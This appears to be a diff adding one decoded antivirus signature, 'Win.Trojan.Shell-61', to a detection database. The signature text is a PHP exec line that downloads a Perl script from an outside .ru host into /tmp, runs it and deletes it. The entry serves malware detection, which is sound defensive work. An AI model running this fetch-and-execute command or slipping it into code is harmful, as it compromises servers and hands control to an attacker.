@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Shell-61
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo exec('cd /tmp;curl -O http://100-matrasov.ru/webstat/hanyar.txt;perl hanyar.txt;rm -rf hanyar.txt*;');
